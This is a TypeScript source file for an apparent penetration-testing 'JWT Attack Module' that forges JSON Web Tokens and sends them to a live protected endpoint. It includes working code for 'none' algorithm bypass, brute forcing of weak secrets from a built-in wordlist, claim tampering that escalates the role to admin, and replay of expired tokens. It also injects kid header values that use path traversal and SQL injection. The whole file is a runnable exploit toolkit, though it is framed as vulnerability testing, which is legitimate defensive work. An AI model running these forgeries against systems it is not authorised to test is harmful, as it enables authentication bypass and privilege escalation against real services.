/**
 * JWT Attack Module
 * 
 * Tests for common JWT vulnerabilities including:
 * - Algorithm confusion (none, HS256 with public key)
 * - Key brute forcing for weak secrets
 * - Token manipulation (claims, expiry)
 * - Signature stripping
 */

import { createHash, createHmac } from "crypto";

export interface JwtAttackConfig {
  targetUrl: string;
  authEndpoint?: string;
  protectedEndpoint: string;
  originalToken: string;
  headers?: Record<string, string>;
}

export interface JwtAnalysis {
  header: JwtHeader;
  payload: JwtPayload;
  signature: string;
  isExpired: boolean;
  expiresIn?: number;
  algorithm: string;
  issuer?: string;
  audience?: string;
  weaknesses: string[];
}

interface JwtHeader {
  alg: string;
  typ?: string;
  kid?: string;
  [key: string]: any;
}

interface JwtPayload {
  sub?: string;
  iss?: string;
  aud?: string | string[];
  exp?: number;
  iat?: number;
  nbf?: number;
  jti?: string;
  [key: string]: any;
}

export interface JwtVulnerability {
  type: "none_algorithm" | "weak_secret" | "expired_accepted" | "signature_bypass" | "claim_injection" | "kid_injection";
  severity: "critical" | "high" | "medium" | "low";
  exploitable: boolean;
  proof?: string;
  forgedToken?: string;
}

export interface JwtAttackResult {
  success: boolean;
  analysis: JwtAnalysis;
  vulnerabilities: JwtVulnerability[];
  evidence: string;
  proofArtifacts: ProofArtifact[];
  executionTimeMs: number;
}

interface ProofArtifact {
  type: string;
  description: string;
  data: string;
  hash: string;
  capturedAt: Date;
}

const COMMON_JWT_SECRETS = [
  "secret", "password", "123456", "jwt_secret", "supersecret",
  "changeme", "test", "development", "key", "private",
  "mykey", "mysecret", "secret_key", "jwt", "token",
  "auth", "authentication", "api_key", "apikey", "admin",
];

export class JwtAttackModule {
  async analyzeToken(token: string): Promise<JwtAnalysis> {
    const parts = token.split(".");
    if (parts.length !== 3) {
      throw new Error("Invalid JWT format");
    }

    const header = this.decodeBase64Url(parts[0]) as JwtHeader;
    const payload = this.decodeBase64Url(parts[1]) as JwtPayload;
    const signature = parts[2];

    const now = Math.floor(Date.now() / 1000);
    const isExpired = payload.exp ? payload.exp < now : false;
    const expiresIn = payload.exp ? payload.exp - now : undefined;

    const weaknesses = this.identifyWeaknesses(header, payload);

    return {
      header,
      payload,
      signature,
      isExpired,
      expiresIn,
      algorithm: header.alg,
      issuer: payload.iss,
      audience: Array.isArray(payload.aud) ? payload.aud.join(",") : payload.aud,
      weaknesses,
    };
  }

  async testNoneAlgorithm(config: JwtAttackConfig): Promise<JwtVulnerability> {
    const parts = config.originalToken.split(".");
    const payload = this.decodeBase64Url(parts[1]) as JwtPayload;

    const noneHeader = { alg: "none", typ: "JWT" };
    const forgedToken = `${this.encodeBase64Url(noneHeader)}.${parts[1]}.`;

    const result = await this.testToken(config, forgedToken);

    return {
      type: "none_algorithm",
      severity: "critical",
      exploitable: result.accepted,
      proof: result.accepted ? "Server accepts tokens with 'none' algorithm" : undefined,
      forgedToken: result.accepted ? forgedToken : undefined,
    };
  }

  async testWeakSecret(config: JwtAttackConfig): Promise<JwtVulnerability> {
    const parts = config.originalToken.split(".");
    const header = this.decodeBase64Url(parts[0]) as JwtHeader;

    if (header.alg !== "HS256" && header.alg !== "HS384" && header.alg !== "HS512") {
      return {
        type: "weak_secret",
        severity: "high",
        exploitable: false,
        proof: `Algorithm ${header.alg} not suitable for secret brute force`,
      };
    }

    const signatureTarget = parts[2];
    const dataToSign = `${parts[0]}.${parts[1]}`;

    for (const secret of COMMON_JWT_SECRETS) {
      const algo = header.alg === "HS256" ? "sha256" : header.alg === "HS384" ? "sha384" : "sha512";
      const testSig = createHmac(algo, secret)
        .update(dataToSign)
        .digest("base64url");

      if (testSig === signatureTarget) {
        return {
          type: "weak_secret",
          severity: "critical",
          exploitable: true,
          proof: `JWT secret cracked: "${secret}"`,
        };
      }
    }

    return {
      type: "weak_secret",
      severity: "high",
      exploitable: false,
      proof: "Secret not found in common wordlist",
    };
  }

  async testExpiredAccepted(config: JwtAttackConfig): Promise<JwtVulnerability> {
    const analysis = await this.analyzeToken(config.originalToken);

    if (!analysis.isExpired) {
      const parts = config.originalToken.split(".");
      const payload = { ...analysis.payload };
      payload.exp = Math.floor(Date.now() / 1000) - 3600;

      const expiredPayload = this.encodeBase64Url(payload);
      const expiredToken = `${parts[0]}.${expiredPayload}.${parts[2]}`;

      const result = await this.testToken(config, expiredToken);

      return {
        type: "expired_accepted",
        severity: "high",
        exploitable: result.accepted,
        proof: result.accepted ? "Server accepts expired tokens (exp validation missing)" : undefined,
        forgedToken: result.accepted ? expiredToken : undefined,
      };
    }

    const result = await this.testToken(config, config.originalToken);

    return {
      type: "expired_accepted",
      severity: "high",
      exploitable: result.accepted,
      proof: result.accepted ? "Server accepts already-expired tokens" : undefined,
    };
  }

  async testClaimInjection(config: JwtAttackConfig): Promise<JwtVulnerability> {
    const parts = config.originalToken.split(".");
    const payload = this.decodeBase64Url(parts[1]) as JwtPayload;

    const modifiedPayload = { ...payload };
    if (modifiedPayload.role) {
      modifiedPayload.role = "admin";
    }
    if (modifiedPayload.admin !== undefined) {
      modifiedPayload.admin = true;
    }
    if (modifiedPayload.is_admin !== undefined) {
      modifiedPayload.is_admin = true;
    }
    if (!modifiedPayload.role && !modifiedPayload.admin && !modifiedPayload.is_admin) {
      modifiedPayload.role = "admin";
      modifiedPayload.admin = true;
    }

    const modifiedPayloadStr = this.encodeBase64Url(modifiedPayload);
    const modifiedToken = `${parts[0]}.${modifiedPayloadStr}.${parts[2]}`;

    const result = await this.testToken(config, modifiedToken);

    return {
      type: "claim_injection",
      severity: "critical",
      exploitable: result.accepted,
      proof: result.accepted
        ? "Server accepts tokens with modified claims (signature not properly verified)"
        : undefined,
      forgedToken: result.accepted ? modifiedToken : undefined,
    };
  }

  async testKidInjection(config: JwtAttackConfig): Promise<JwtVulnerability> {
    const parts = config.originalToken.split(".");
    const header = this.decodeBase64Url(parts[0]) as JwtHeader;

    if (!header.kid) {
      return {
        type: "kid_injection",
        severity: "medium",
        exploitable: false,
        proof: "Token does not use 'kid' header",
      };
    }

    const payloads = [
      { ...header, kid: "../../../dev/null" },
      { ...header, kid: "/dev/null" },
      { ...header, kid: "" },
      { ...header, kid: "' OR '1'='1" },
    ];

    for (const modifiedHeader of payloads) {
      const modifiedHeaderStr = this.encodeBase64Url(modifiedHeader);
      const payload = this.decodeBase64Url(parts[1]);
      
      const emptySecret = "";
      const dataToSign = `${modifiedHeaderStr}.${parts[1]}`;
      const newSig = createHmac("sha256", emptySecret)
        .update(dataToSign)
        .digest("base64url");

      const modifiedToken = `${modifiedHeaderStr}.${parts[1]}.${newSig}`;
      const result = await this.testToken(config, modifiedToken);

      if (result.accepted) {
        return {
          type: "kid_injection",
          severity: "critical",
          exploitable: true,
          proof: `KID injection successful with payload: ${modifiedHeader.kid}`,
          forgedToken: modifiedToken,
        };
      }
    }

    return {
      type: "kid_injection",
      severity: "medium",
      exploitable: false,
      proof: "KID injection attempts failed",
    };
  }

  async runFullAttack(config: JwtAttackConfig): Promise<JwtAttackResult> {
    const startTime = Date.now();
    const proofArtifacts: ProofArtifact[] = [];
    const evidence: string[] = [];
    const vulnerabilities: JwtVulnerability[] = [];

    const analysis = await this.analyzeToken(config.originalToken);
    evidence.push(`Algorithm: ${analysis.algorithm}, Issuer: ${analysis.issuer || "none"}`);
    
    if (analysis.weaknesses.length > 0) {
      evidence.push(`Weaknesses: ${analysis.weaknesses.join(", ")}`);
    }

    proofArtifacts.push({
      type: "jwt_analysis",
      description: "Token structure analysis",
      data: JSON.stringify({
        algorithm: analysis.algorithm,
        claims: Object.keys(analysis.payload),
        isExpired: analysis.isExpired,
        weaknesses: analysis.weaknesses,
      }),
      hash: createHash("sha256").update(JSON.stringify(analysis)).digest("hex"),
      capturedAt: new Date(),
    });

    const noneResult = await this.testNoneAlgorithm(config);
    vulnerabilities.push(noneResult);
    if (noneResult.exploitable) {
      evidence.push("CRITICAL: None algorithm accepted");
      proofArtifacts.push({
        type: "none_algorithm_vuln",
        description: "None algorithm bypass",
        data: noneResult.forgedToken || "",
        hash: createHash("sha256").update(noneResult.forgedToken || "").digest("hex"),
        capturedAt: new Date(),
      });
    }

    const weakSecretResult = await this.testWeakSecret(config);
    vulnerabilities.push(weakSecretResult);
    if (weakSecretResult.exploitable) {
      evidence.push(`CRITICAL: ${weakSecretResult.proof}`);
      proofArtifacts.push({
        type: "weak_secret_vuln",
        description: "Weak JWT secret",
        data: weakSecretResult.proof || "",
        hash: createHash("sha256").update(weakSecretResult.proof || "").digest("hex"),
        capturedAt: new Date(),
      });
    }

    const expiredResult = await this.testExpiredAccepted(config);
    vulnerabilities.push(expiredResult);
    if (expiredResult.exploitable) {
      evidence.push("HIGH: Expired tokens accepted");
    }

    const claimResult = await this.testClaimInjection(config);
    vulnerabilities.push(claimResult);
    if (claimResult.exploitable) {
      evidence.push("CRITICAL: Claim injection possible");
    }

    if (analysis.header.kid) {
      const kidResult = await this.testKidInjection(config);
      vulnerabilities.push(kidResult);
      if (kidResult.exploitable) {
        evidence.push("CRITICAL: KID injection successful");
      }
    }

    const exploitableVulns = vulnerabilities.filter(v => v.exploitable);
    const success = exploitableVulns.length > 0;

    return {
      success,
      analysis,
      vulnerabilities,
      evidence: evidence.join("; "),
      proofArtifacts,
      executionTimeMs: Date.now() - startTime,
    };
  }

  private decodeBase64Url(str: string): any {
    const base64 = str.replace(/-/g, "+").replace(/_/g, "/");
    const padding = "=".repeat((4 - (base64.length % 4)) % 4);
    return JSON.parse(Buffer.from(base64 + padding, "base64").toString());
  }

  private encodeBase64Url(obj: any): string {
    return Buffer.from(JSON.stringify(obj))
      .toString("base64")
      .replace(/\+/g, "-")
      .replace(/\//g, "_")
      .replace(/=+$/, "");
  }

  private identifyWeaknesses(header: JwtHeader, payload: JwtPayload): string[] {
    const weaknesses: string[] = [];

    if (header.alg === "none") {
      weaknesses.push("Algorithm is 'none'");
    }

    if (header.alg === "HS256" && header.kid) {
      weaknesses.push("HS256 with kid - potential key confusion");
    }

    if (!payload.exp) {
      weaknesses.push("No expiration claim");
    }

    if (!payload.iss) {
      weaknesses.push("No issuer claim");
    }

    if (!payload.aud) {
      weaknesses.push("No audience claim");
    }

    if (!payload.jti) {
      weaknesses.push("No JWT ID (jti) - replay possible");
    }

    if (payload.exp && payload.iat) {
      const lifetime = payload.exp - payload.iat;
      if (lifetime > 86400 * 7) {
        weaknesses.push("Token lifetime > 7 days");
      }
    }

    return weaknesses;
  }

  private async testToken(
    config: JwtAttackConfig,
    token: string
  ): Promise<{ accepted: boolean; statusCode?: number }> {
    try {
      const response = await fetch(config.protectedEndpoint, {
        method: "GET",
        headers: {
          ...config.headers,
          Authorization: `Bearer ${token}`,
        },
      });

      return {
        accepted: response.status !== 401 && response.status !== 403,
        statusCode: response.status,
      };
    } catch {
      return { accepted: false };
    }
  }
}
